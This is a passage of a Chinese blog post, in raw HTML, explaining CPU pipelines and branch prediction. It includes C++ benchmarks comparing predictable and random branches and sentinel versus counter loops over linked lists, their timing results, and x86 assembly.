&lt;span class="n">sum&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用 clang++ 编译&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># clang version 13.0.0&lt;/span>
&lt;span class="c1"># Target: x86_64-pc-windows-msvc&lt;/span>
&lt;span class="c1"># Thread model: posix&lt;/span>
&lt;span class="c1"># InstalledDir: C:\Program Files\LLVM\bin&lt;/span>
clang++.exe -m32 -O0 -g -std&lt;span class="o">=&lt;/span>c++20 .&lt;span class="se">\b&lt;/span>ranch-prediction-1.cpp -o branch-prediction-1.exe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>统计平均、最佳、最差耗时，输出结果如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">always true avg: 120ms best: 116ms worst: 246ms total: 12056ms
unpredictable avg: 191ms best: 184ms worst: 265ms total: 19115ms
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到，数据量相同的情况下，输入数据是随机 T/F 的平均耗时比总为真的耗时高出 50%，总耗时多出 7 秒左右（差不多也是50%多一点）。可想而知，如果输入数据更有规律（比如前半段都是T后半段都是F），数据量不变的情况下，性能也会有相当不错的提高。&lt;/p>
&lt;p>顺便我还要说一下这个基准测试不够好，应该每个测试循环都生成一次随机数输入的。&lt;/p>
&lt;h3 id="分支预测扮演的角色">分支预测扮演的角色&lt;/h3>
&lt;p>这还得从CPU执行指令的过程说起。这里聊的 CPU 执行一条指令需要经过下面的步骤，称作流水线。计算机组成原理课应该有说。&lt;/p>
&lt;ul>
&lt;li>取指 (fetch)&lt;/li>
&lt;li>译码 (decode)&lt;/li>
&lt;li>执行 (算数指令走 ALU)&lt;/li>
&lt;li>访问主存 (Load/Store)&lt;/li>
&lt;li>写回&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/how-branch-prediction-effects-executoin-performance-and-security/1365470-20181201231438070-1210623531.png"
width="1237"
height="583"
srcset="https://nnnewb.github.io/blog/blog/p/how-branch-prediction-effects-executoin-performance-and-security/1365470-20181201231438070-1210623531_hud9ed14138f8676bf12375622c7bab6ae_181582_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/how-branch-prediction-effects-executoin-performance-and-security/1365470-20181201231438070-1210623531_hud9ed14138f8676bf12375622c7bab6ae_181582_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="单周期处理器和流水线处理器"
class="gallery-image"
data-flex-grow="212"
data-flex-basis="509px"
>&lt;/p>
&lt;p>更简化一点的话可以把ALU算数运算和访存都算作指令的“执行”阶段，CPU就是在不断循环执行这四个动作。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/how-branch-prediction-effects-executoin-performance-and-security/500pxPipeline_4_stage_svg.png"
width="500"
height="479"
srcset="https://nnnewb.github.io/blog/blog/p/how-branch-prediction-effects-executoin-performance-and-security/500pxPipeline_4_stage_svg_hu15edc282cd853d13d1b62dfc619067e7_33080_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/how-branch-prediction-effects-executoin-performance-and-security/500pxPipeline_4_stage_svg_hu15edc282cd853d13d1b62dfc619067e7_33080_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="4阶段流水线"
class="gallery-image"
data-flex-grow="104"
data-flex-basis="250px"
>&lt;/p>
&lt;p>流水线处理器为了充分利用硬件，在译码上一条指令时，就开始取指下一条指令了，执行速度可以是单周期处理器的很多倍。显然流水线越长，每个阶段的耗时越短，整体执行的效率就越高。&lt;/p>
&lt;p>如果指令一直按顺序执行，流水线只要不断加长加快就能获得更高的性能，但“分支”打破了这个美梦。一个简短的例子如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">loop:&lt;/span>
&lt;span class="nf">inc&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nf">cmp&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">ebx&lt;/span>
&lt;span class="nf">jne&lt;/span> &lt;span class="no">loop&lt;/span>
&lt;span class="nf">call&lt;/span> &lt;span class="no">exit&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>CPU 从 &lt;code>cmp eax,ebx&lt;/code> 开始，取指 &lt;code>jne loop&lt;/code>。译码 &lt;code>jne loop&lt;/code> 时，问题来了，接下来是取指 &lt;code>call exit&lt;/code> 还是 &lt;code>inc eax&lt;/code>？&lt;/p>
&lt;p>此时我们还不知道 &lt;code>cmp eax,ebx&lt;/code> 的结果，CPU 能做的事情只有：傻等(stall)，或者猜测下一条要执行的指令是什么(predict)。&lt;/p>
&lt;p>现代处理器的流水线长度可以达到几十，如果 CPU 遇到需要上一条指令的结果来继续下一条指令就开始等，那么流水线就不得不闲置到上一条指令完成，结果就是分支指令的代价会是其他指令的几十倍，对循环语句来说是个噩耗。&lt;/p>
&lt;p>影响流水线效率的还有其他元素，比如说上面的 取值-译码-执行-写回 过程里，四个阶段的执行速度也是不同的。通常取值和译码的速度更慢，执行写回更快。如何尽可能让每个执行单元都不浪费时间等待，也是个难题。&lt;/p>
&lt;p>关于流水线，&lt;a class="link" href="https://plantegg.github.io/2021/05/16/Perf_IPC%E4%BB%A5%E5%8F%8ACPU%E5%88%A9%E7%94%A8%E7%8E%87/" target="_blank" rel="noopener"
>Perf IPC 以及 CPU 利用率&lt;/a> 这篇文章感觉不错。&lt;/p>
&lt;p>继续说。既然让流水线退化到单周期不可取，那就瞎猜一个，先把流水线填满再说呗，反正不会比傻等更差了。于是就有了分支预测器：虽然是瞎猜，但尽可能猜得准一点总没坏处。&lt;/p>
&lt;h3 id="减少分支预测失败的损失">减少分支预测失败的损失&lt;/h3>
&lt;p>实话说我不确定这个代价有多大，因为没法控制失败率，不知道现在正在用的 CPU 的分支预测器是怎么工作的。&lt;/p>
&lt;p>直接构造随机的 T/F 序列是一种办法，前面的基准测试已经验证了随机 T/F 干扰分支预测会产生接近 50% 的多余开销。那么有没有办法降低分支预测失败的损失呢？怎么让 CPU 更早发现到分支预测失败，减少要抛弃、清空的流水线长度？&lt;/p>
&lt;p>参考前面爆栈的链接 &lt;a class="link" href="https://stackoverflow.com/questions/49932119/avoid-stalling-pipeline-by-calculating-conditional-early" target="_blank" rel="noopener"
>avoid stalling pipeline by calculating conditional early&lt;/a> ，我简单写一个基准测试看看。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;functional&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;chrono&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;vector&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cstdlib&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;random&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">using&lt;/span> &lt;span class="k">namespace&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">chrono&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">milliseconds&lt;/span> &lt;span class="nf">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">fn&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_clock&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">duration_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">milliseconds&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stop&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">benchmark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">uint32_t&lt;/span> &lt;span class="n">loops&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">function&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">milliseconds&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lowest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">highest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">loops&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time_it&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">sum&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">lowest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lowest&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="n">ms&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">d&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">lowest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">highest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">max&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">highest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; avg: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">sum&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">loops&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; best: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">lowest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; worst: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">highest&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34; total: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">sum&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ms&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">my_node&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">my_node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">my_node&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">nullptr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">my_node&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">my_list&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">my_node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">my_node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">last&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">my_list&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">head&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">nullptr&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">last&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">nullptr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">append&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">head&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">head&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">my_node&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">head&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">last&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">my_node&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">last&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">length&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="n">my_list&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">sum_sentinel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_list&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">cur&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">nullptr&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cur&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">sum&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">cur&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">sum_counter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_list&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">my_node&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">cur&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cur&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">sum&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">cur&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">my_list&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">lists&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">lists&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">resize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10000000&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">random_device&lt;/span> &lt;span class="n">rd&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">mt19937&lt;/span> &lt;span class="n">gen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rd&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="n">uniform_int_distribution&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">dist&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nl">list&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">lists&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">node_count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">dist&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gen&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">node_count&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">list&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">benchmark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;sentinel&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lists&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">list&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">lists&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">sum_sentinel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="n">benchmark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;counter&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lists&lt;/span>&lt;span class="p">]()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">list&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">lists&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">sum_counter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">list&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">sentinel avg: 471ms best: 470ms worst: 502ms total: 47178ms
counter avg: 407ms best: 402ms worst: 512ms total: 40726ms
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这简直是黑魔法！&lt;code>sum_counter&lt;/code>明显需要执行更多的指令，但执行速度比指令更少的&lt;code>sum_sentinel&lt;/code>平均快70ms！&lt;/p>
&lt;p>造成慢的原因是一样的，因为分支预测失败，我们以上面的4阶段流水线来分析，假设每个阶段要一个时钟周期，等CPU发现取错了指令（比如译码完了&lt;code>add&lt;/code>，发现&lt;code>cur!=nullptr&lt;/code>是F），于是浪费了两个时钟周期。这被称为 &lt;em>front end bubble&lt;/em> 。参考 cloud flare 的这篇博客，&lt;a class="link" href="https://blog.cloudflare.com/branch-predictor/" target="_blank" rel="noopener"
>branch predictor&lt;/a> 。这个 &lt;em>front end&lt;/em> 指的是 CPU 微架构中流水线的前端，形象地看，流水线就像是一节一节的水管，指令填满每一节水管，流向下一节。分支预测失败就像是中间一节水管突然空了，后面的指令继续推着空气（预测错误的指令）往前走，就成了水管里的一个泡泡。&lt;/p>
&lt;p>但 &lt;code>sum_counter&lt;/code> 快的原因更神奇：因为指令排列的顺序，让分支预测依赖的指令更早进入流水线，因此分支指令进入流水线后，分支预测会更快发现预测错误。见下面的汇编代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">&amp;lt;&lt;/span>&lt;span class="nf">sum_sentinel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">list_head&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nf">test&lt;/span> &lt;span class="no">rsi&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">rsi&lt;/span>
&lt;span class="nf">je&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">fe&lt;/span> &lt;span class="err">&amp;lt;&lt;/span>&lt;span class="no">sum_sentinel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">list_head&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x1e&lt;/span>&lt;span class="err">&amp;gt;&lt;/span>
&lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">eax&lt;/span>
&lt;span class="nl">loop:&lt;/span>
&lt;span class="nf">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="no">DWORD&lt;/span> &lt;span class="no">PTR&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">rsi&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; --- 1
